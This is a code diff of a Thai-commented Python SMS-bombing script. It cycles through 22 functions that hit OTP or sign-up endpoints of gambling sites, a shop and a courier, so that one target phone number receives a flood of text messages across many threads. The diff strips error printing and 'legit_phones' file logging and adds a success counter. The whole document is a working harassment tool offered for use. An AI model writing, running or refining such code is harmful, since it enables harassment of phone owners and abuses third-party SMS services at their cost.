@@ -50,8 +50,7 @@ def api1(phone):
         if response.status_code == 200 and '"code":1' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Gogo-Shop: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api2(phone):
@@ -63,8 +62,7 @@ def api2(phone):
         if response.status_code == 200 and '"code":200' in response.text:
             return response, json.loads(response.text).get("result", {}).get("reference", "N/A")
         return response, None
-    except Exception as e:
-        print(f"Kex-Express: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api3(phone):
@@ -77,8 +75,7 @@ def api3(phone):
         if response.status_code == 200 and '"Success":true' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Jaomuehuay: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api4(phone):
@@ -91,8 +88,7 @@ def api4(phone):
         if response.status_code == 200 and '"status":true' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Jut8: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api5(phone):
@@ -105,8 +101,7 @@ def api5(phone):
         if response.status_code == 200 and '"status":"success"' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Cdo888: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api6(phone):
@@ -119,8 +114,7 @@ def api6(phone):
         if response.status_code == 200 and '"status":"success"' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Joneslot: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api7(phone):
@@ -133,8 +127,7 @@ def api7(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Swin168: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api8(phone):
@@ -147,8 +140,7 @@ def api8(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Johnwick168: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api9(phone):
@@ -161,8 +153,7 @@ def api9(phone):
         if response.status_code == 200 and '"status":"success"' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Skyslot7: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api10(phone):
@@ -175,8 +166,7 @@ def api10(phone):
         if response.status_code == 200 and '"code":200' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Mgi88: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api11(phone):
@@ -189,8 +179,7 @@ def api11(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"DeeCasino: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api12(phone):
@@ -203,8 +192,7 @@ def api12(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Mgame666: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api13(phone):
@@ -217,8 +205,7 @@ def api13(phone):
         if response.status_code == 200 and '"error":false' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Prompkai: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api14(phone):
@@ -231,8 +218,7 @@ def api14(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Fun24: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api15(phone):
@@ -245,8 +231,7 @@ def api15(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Wm78bet: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api16(phone):
@@ -259,8 +244,7 @@ def api16(phone):
         if response.status_code == 200 and '"code":200' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Happy168: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api17(phone):
@@ -273,8 +257,7 @@ def api17(phone):
         if response.status_code == 200 and '"code":200' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Pgheng: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api18(phone):
@@ -287,8 +270,7 @@ def api18(phone):
         if response.status_code == 200:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Aplusfun: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api19(phone):
@@ -301,8 +283,7 @@ def api19(phone):
         if response.status_code in (200, 201) and '"message":"ดำเนินการสำเร็จ"' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Cueu77778887: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api20(phone):
@@ -315,8 +296,7 @@ def api20(phone):
         if response.status_code == 200 and '"status":"success"' in response.text:
             return response, json.loads(response.text).get("data", {}).get("otp_token", "N/A")
         return response, None
-    except Exception as e:
-        print(f"Oneforbet: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api21(phone):
@@ -329,8 +309,7 @@ def api21(phone):
         if response.status_code == 200 and '"code":200' in response.text:
             return response, "N/A"
         return response, None
-    except Exception as e:
-        print(f"Joker123ths: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def api22(phone):
@@ -343,8 +322,7 @@ def api22(phone):
         if response.status_code == 200 and '"status":"SUCCESS"' in response.text:
             return response, json.loads(response.text).get("data", {}).get("otp_ref_code", "N/A")
         return response, None
-    except Exception as e:
-        print(f"Jklmn23456: เกิดข้อผิดพลาด: {str(e)}")
+    except Exception:
         return None, None
 
 def clean_phone_number(phone):
@@ -355,7 +333,7 @@ def clean_phone_number(phone):
     phone = "".join(filter(str.isdigit, phone))
     return phone
 
-def process_phone_with_api(phone, api_name, legit_file_path):
+def process_phone_with_api(phone, api_name, success_count):
     retry_delay = 5000  # 5000 วินาที
     current_time = time.time()
 
@@ -364,12 +342,11 @@ def process_phone_with_api(phone, api_name, legit_file_path):
         if not api_status[api_name]["active"] and current_time >= api_status[api_name]["cooldown"]:
             api_status[api_name]["active"] = True
             api_status[api_name]["notified"] = False
-            print(f"{api_name} กลับมาใช้งานได้สำหรับเบอร์ {phone}")
 
     # ถ้า API ไม่ active ให้ข้าม
     with api_lock:
         if not api_status[api_name]["active"]:
-            return False
+            return False, success_count
 
     # เลือก API ตามชื่อ
     api_map = {
@@ -405,42 +382,33 @@ def process_phone_with_api(phone, api_name, legit_file_path):
 
     success_condition = response and response.status_code in (200, 201)
     if success_condition:
-        print(f"{api_label} - เบอร์ {phone}: Status {response.status_code} | Response Time: {response_time:.2f} วินาที | Ref: {ref}")
-        with file_lock:
-            with open(legit_file_path, "a", encoding="utf-8") as legit_file:
-                legit_file.write(f"{phone} | Status: {response.status_code} | API: {api_label} | Ref: {ref}\n")
-        return True
+        print(f"ส่ง SMS สำเร็จครั้งที่ {success_count[0] + 1} | เบอร์ {phone} | Response Time: {response_time:.2f} วินาที | Ref: {ref}")
+        success_count[0] += 1
+        return True, success_count
     else:
-        print(f"{api_label} - เบอร์ {phone}: ไม่สำเร็จ | Status: {response.status_code if response else 'N/A'}")
         with api_lock:
             if not api_status[api_name]["notified"]:
-                print(f"{api_name} ใช้ไม่ได้ รอ {retry_delay} วินาที")
                 api_status[api_name]["notified"] = True
             api_status[api_name]["active"] = False
             api_status[api_name]["cooldown"] = current_time + retry_delay
-        return False
+        return False, success_count
 
-def worker(phone, api_name, legit_file_path, attempt_number):
+def worker(phone, api_name, attempt_number, success_count):
     """ประมวลผลการส่ง SMS ด้วย API ที่ระบุ"""
     phone = phone.strip()
     if not phone:
-        print(f"Attempt {attempt_number}: ไม่มีเบอร์โทรศัพท์ที่ระบุ")
         return
 
     try:
         parsed_number = phonenumbers.parse(phone, "TH")
         if not (phonenumbers.is_valid_number(parsed_number) and phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE):
-            print(f"Attempt {attempt_number} - เบอร์ {phone}: ไม่ใช่เบอร์มือถือที่ถูกต้อง")
             return
     except phonenumbers.NumberParseException:
-        print(f"Attempt {attempt_number} - เบอร์ {phone}: รูปแบบไม่ถูกต้อง")
         return
 
-    success = process_phone_with_api(phone, api_name, legit_file_path)
-    if not success:
-        print(f"Attempt {attempt_number} - เบอร์ {phone}: API {api_name} ไม่สำเร็จ")
+    success, success_count = process_phone_with_api(phone, api_name, success_count)
 
-def send_sms_to_number(phone_number, num_attempts, legit_file_path="legit_phones.txt"):
+def send_sms_to_number(phone_number, num_attempts):
     """ฟังก์ชันหลักสำหรับรับเบอร์โทรและจำนวนครั้งจากผู้ใช้ และส่ง SMS พร้อมกัน"""
     cleaned_phone = clean_phone_number(phone_number)
     if not cleaned_phone or len(cleaned_phone) != 10:
@@ -469,13 +437,14 @@ def send_sms_to_number(phone_number, num_attempts, legit_file_path="legit_phones
     # จำกัดจำนวน thread ตามจำนวน API ที่ใช้งานได้
     max_threads = min(num_attempts, len(active_apis))
     threads = []
+    success_count = [0]  # ใช้ list เพื่อเก็บจำนวนครั้งที่สำเร็จ (mutable)
 
     # สร้าง thread สำหรับแต่ละการส่ง
     for i in range(num_attempts):
         # เลือก API โดยวนลูปตามจำนวนครั้ง
         api_index = i % len(active_apis)  # วนใช้ API ที่ใช้งานได้
         api_name = active_apis[api_index]
-        t = threading.Thread(target=worker, args=(cleaned_phone, api_name, legit_file_path, i + 1))
+        t = threading.Thread(target=worker, args=(cleaned_phone, api_name, i + 1, success_count))
         threads.append(t)
         t.start()
 
@@ -486,7 +455,7 @@ def send_sms_to_number(phone_number, num_attempts, legit_file_path="legit_phones
     for t in threads:
         t.join()
 
-    print(f"การส่ง SMS {num_attempts} ครั้ง เสร็จสิ้น ✅")
+    print(f"การส่ง SMS {num_attempts} ครั้ง เสร็จสิ้น | ส่งสำเร็จ {success_count[0]} ครั้ง ✅")
 
 # ตัวอย่างการใช้งาน
 if __name__ == "__main__":
